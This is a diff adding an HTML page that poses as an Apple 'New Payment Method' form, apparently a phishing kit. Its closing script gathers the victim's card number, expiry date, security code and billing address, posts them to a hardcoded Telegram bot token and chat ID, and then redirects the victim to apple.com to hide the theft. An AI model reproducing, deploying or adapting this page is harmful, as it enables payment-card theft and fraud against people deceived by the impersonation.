@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <title>OnlineForm</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;500;600&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        body {
+            background: #f4f7fc;
+            color: #333;
+            font-size: 14px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 99dvh;
+            margin: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: -1;
+        }
+
+        @supports (-webkit-touch-callout: none) {
+            body {
+                min-height: -webkit-fill-available;
+            }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 700px;
+            background: rgba(255, 255, 255, 0.7);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            border-radius: 20px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            max-height: 95dvh;
+            backdrop-filter: blur(5px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .form-container {
+            padding: 40px;
+            overflow-y: auto;
+            flex-grow: 1;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .apple-logo {
+            width: 50px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 500;
+            color: #1d1d1f;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .form-subtitle {
+            font-size: 12px;
+            text-align: center;
+            color: #888;
+            margin-bottom: 20px;
+        }
+        
+        .form-subtitle1 {
+            font-size: 12px;
+            text-align: center;
+            color: #404040;
+            margin-bottom: 20px;
+        }
+
+        .inputBox {
+            margin-bottom: 17px;
+        }
+
+        .inputBox span {
+            display: block;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        .inputBox input,
+        .inputBox select {
+            width: 100%;
+            padding: 15px;
+            border-radius: 18px;
+            border: 1px solid #404040;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            height: 60px;
+            background: rgba(255, 255, 255, 0.7);
+        }
+
+        .inputBox select {
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background: rgba(255, 255, 255, 0.7) url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="%23333" d="M7 10l5 5 5-5z"/></svg>') no-repeat right 15px center/12px;
+        }
+
+        .inputBox input:focus,
+        .inputBox select:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
+            background: rgba(255, 255, 255, 0.9);
+        }
+
+        .flex {
+            display: flex;
+            gap: 15px;
+        }
+
+        .flex.vertical {
+            flex-direction: column;
+        }
+
+        .submit-btn {
+            width: 36%;
+            padding: 12px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: block;
+            margin-left: auto;
+        }
+
+        .submit-btn:hover {
+            background-color: #0056b3;
+        }
+
+        .footer {
+            box-shadow: 0 4px 15px rgba(1, 1, 1, 0.1);
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+            background: rgba(255, 255, 255, 0.7);
+        }
+
+        @media (max-width: 600px) {
+            .flex {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="form-container">
+            <div class="logo-container">
+                <img src="ape.png" alt="Apple Logo" class="apple-logo">
+            </div>
+            <h3 class="form-title">New Payment Method</h3>
+            <p class="form-subtitle1">This will be saved as your new default payment method.</p>
+            <p class="form-subtitle">You won't be charged until you make a purchase. You authorize Apple to charge this default payment method for paid transactions, and if there is a problem, your next eligible payment methods. If you are a Family Organizer with Purchase Sharing enabled, your eligible payment methods may be shared for family member purchases.</p>
+
+            <!-- Payment Type Dropdown -->
+            <div class="inputBox">
+                <span>Payment Type:</span>
+                <select id="paymentType" required>
+                    <option value="credit">Credit/Debit Card</option>
+                    <option value="paypal">PayPal</option>
+                </select>
+            </div>
+
+            <h3>Card Details</h3>
+            <div class="inputBox">
+                <input type="number" placeholder="5555 5555 5555 5555" required>
+            </div>
+            <div class="flex">
+                <div class="inputBox">
+                    <span>Expiration Date:</span>
+                    <input type="text" placeholder="MM/YYYY" required>
+                </div>
+                <div class="inputBox">
+                    <span>Security Code:</span>
+                    <input type="number" placeholder="CVC" required>
+                </div>
+            </div>
+
+            <h3>Billing Address</h3>
+            <div class="flex">
+                <div class="inputBox">
+                    <input type="text" placeholder="First Name" required>
+                </div>
+                <div class="inputBox">
+                    <input type="text" placeholder="Last Name" required>
+                </div>
+            </div>
+
+            <div class="inputBox">
+                <input type="text" placeholder="Street" required>
+            </div>
+            <div class="inputBox">
+                <input type="text" placeholder="Apt/Optional">
+            </div>
+            <div class="inputBox">
+                <input type="text" placeholder="City" required>
+            </div>
+            <div class="flex vertical">
+                <div class="inputBox">
+                    <select id="state" required>
+                        <option value="" disabled selected>Select</option>
+                        <option value="AL">Alabama</option>
+                        <option value="AK">Alaska</option>
+                        <option value="AZ">Arizona</option>
+                        <option value="AR">Arkansas</option>
+                        <option value="CA">California</option>
+                        <option value="CO">Colorado</option>
+                        <option value="CT">Connecticut</option>
+                        <option value="DE">Delaware</option>
+                        <option value="FL">Florida</option>
+                        <option value="GA">Georgia</option>
+                        <option value="HI">Hawaii</option>
+                        <option value="ID">Idaho</option>
+                        <option value="IL">Illinois</option>
+                        <option value="IN">Indiana</option>
+                        <option value="IA">Iowa</option>
+                        <option value="KS">Kansas</option>
+                        <option value="KY">Kentucky</option>
+                        <option value="LA">Louisiana</option>
+                        <option value="ME">Maine</option>
+                        <option value="MD">Maryland</option>
+                        <option value="MA">Massachusetts</option>
+                        <option value="MI">Michigan</option>
+                        <option value="MN">Minnesota</option>
+                        <option value="MS">Mississippi</option>
+                        <option value="MO">Missouri</option>
+                        <option value="MT">Montana</option>
+                        <option value="NE">Nebraska</option>
+                        <option value="NV">Nevada</option>
+                        <option value="NH">New Hampshire</option>
+                        <option value="NJ">New Jersey</option>
+                        <option value="NM">New Mexico</option>
+                        <option value="NY">New York</option>
+                        <option value="NC">North Carolina</option>
+                        <option value="ND">North Dakota</option>
+                        <option value="OH">Ohio</option>
+                        <option value="OK">Oklahoma</option>
+                        <option value="OR">Oregon</option>
+                        <option value="PA">Pennsylvania</option>
+                        <option value="RI">Rhode Island</option>
+                        <option value="SC">South Carolina</option>
+                        <option value="SD">South Dakota</option>
+                        <option value="TN">Tennessee</option>
+                        <option value="TX">Texas</option>
+                        <option value="UT">Utah</option>
+                        <option value="VT">Vermont</option>
+                        <option value="VA">Virginia</option>
+                        <option value="WA">Washington</option>
+                        <option value="WV">West Virginia</option>
+                        <option value="WI">Wisconsin</option>
+                        <option value="WY">Wyoming</option>
+                    </select>
+                </div>
+                <div class="inputBox">
+                    <input type="text" placeholder="Zip" required>
+                </div>
+            </div>
+        </div>
+        <footer class="footer">
+            <button type="submit" class="submit-btn" id="submit-btn">Save Changes</button>
+        </footer>
+    </div>
+
+<script>
+    document.getElementById("submit-btn").addEventListener("click", function(event) {
+        event.preventDefault();
+        const paymentType = document.getElementById("paymentType").value;
+        const cardNumber = document.querySelector("input[placeholder='5555 5555 5555 5555']").value;
+        const cardExpDate = document.querySelector("input[placeholder='MM/YYYY']").value;
+        const cardCVC = document.querySelector("input[placeholder='CVC']").value;
+        const firstName = document.querySelector("input[placeholder='First Name']").value;
+        const lastName = document.querySelector("input[placeholder='Last Name']").value;
+        const street = document.querySelector("input[placeholder='Street']").value;
+        const apt = document.querySelector("input[placeholder='Apt/Optional']").value;
+        const city = document.querySelector("input[placeholder='City']").value;
+        const state = document.getElementById("state").value;
+        const zip = document.querySelector("input[placeholder='Zip']").value;
+
+        const message = `
+        💳 New Payment Method Details:
+        🏧 Payment Type: ${paymentType}
+        🔢 Card Number: ${cardNumber}
+        📅 Expiration Date: ${cardExpDate}
+        🔒 Security Code: ${cardCVC}
+        👤 First Name: ${firstName}
+        👤 Last Name: ${lastName}
+        🏠 Street: ${street}
+        🏢 Apt: ${apt} 
+        🌆 City: ${city} 
+        🏙️ State: ${state} 
+        📍 Zip: ${zip}
+        `;
+
+        sendToTelegram(message);
+    });
+
+    function sendToTelegram(message) {
+        const botToken = '8336200796:AAH6PRCPJxGkIvwpx25UPcZkBkOilFZ4AuA';
+        const chatId = '7319204418';
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const data = {
+            chat_id: chatId,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                window.location.href = 'https://apple.com';
+            } else {
+                alert('Failed to send data');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Error sending data');
+        });
+    }
+</script>
+</body>
+</html>
